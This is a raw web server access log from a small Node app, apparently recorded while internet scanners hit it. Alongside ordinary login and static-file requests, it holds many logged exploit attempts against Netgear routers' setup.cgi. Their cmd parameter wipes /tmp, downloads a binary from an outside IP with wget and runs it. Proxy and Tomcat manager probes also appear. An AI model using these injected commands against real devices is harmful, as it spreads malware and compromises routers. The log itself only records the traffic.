port： 8080
[0mGET /login [36m304 [0m396.402 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.749 ms - -[0m
[0mGET /stylesheets/bootstrap-theme.min.css [36m304 [0m0.581 ms - -[0m
[0mGET /stylesheets/basic.css [36m304 [0m0.396 ms - -[0m
[0mGET /javascripts/jquery-3.1.1.min.js [36m304 [0m0.299 ms - -[0m
[0mGET /javascripts/bootstrap.js [36m304 [0m0.514 ms - -[0m
[0mGET /javascripts/pagination.js [36m304 [0m0.418 ms - -[0m
[0mGET /javascripts/common.js [36m304 [0m0.404 ms - -[0m
port： 8080
[0mGET /login [32m200 [0m397.837 ms - 1437[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.913 ms - -[0m
[0mGET /stylesheets/bootstrap-theme.min.css [36m304 [0m0.993 ms - -[0m
[0mGET /stylesheets/basic.css [36m304 [0m0.868 ms - -[0m
[0mGET /javascripts/jquery-3.1.1.min.js [36m304 [0m0.324 ms - -[0m
[0mGET /javascripts/bootstrap.js [36m304 [0m0.510 ms - -[0m
[0mGET /javascripts/pagination.js [36m304 [0m0.345 ms - -[0m
[0mGET /javascripts/common.js [36m304 [0m0.297 ms - -[0m
[0mGET /login [36m304 [0m49.580 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.394 ms - -[0m
[0mGET /stylesheets/bootstrap-theme.min.css [36m304 [0m0.301 ms - -[0m
[0mGET /javascripts/bootstrap.js [36m304 [0m0.269 ms - -[0m
[0mGET /javascripts/pagination.js [36m304 [0m0.423 ms - -[0m
[0mGET /javascripts/jquery-3.1.1.min.js [36m304 [0m0.479 ms - -[0m
[0mGET /stylesheets/basic.css [36m304 [0m0.411 ms - -[0m
[0mGET /javascripts/common.js [36m304 [0m0.298 ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET http://www.baidu.com/cache/global/img/gs.gif [33m404 [0m26.732 ms - 1913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [33m404 [0m31.562 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [33m404 [0m36.483 ms - 1913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [33m404 [0m25.256 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [33m404 [0m28.402 ms - 1913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [33m404 [0m30.595 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET http://www.baidu.com/cache/global/img/gs.gif [33m404 [0m17.113 ms - 1913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/cock+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/cock+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m14.996 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /manager/html [33m404 [0m20.677 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET http://clientapi.ipip.net/echo.php?info=20181002144615 [33m404 [0m12.349 ms - 1913[0m
[0mGET /manager/html [33m404 [0m12.983 ms - 1913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [33m404 [0m13.679 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET http://www.baidu.com/cache/global/img/gs.gif [33m404 [0m15.442 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET http://www.baidu.com/cache/global/img/gs.gif [33m404 [0m13.836 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://80.211.6.55/cock+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m12.963 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET http://www.baidu.com/cache/global/img/gs.gif [33m404 [0m12.431 ms - 1913[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
[0mGET / [0m- [0m- ms - -[0m
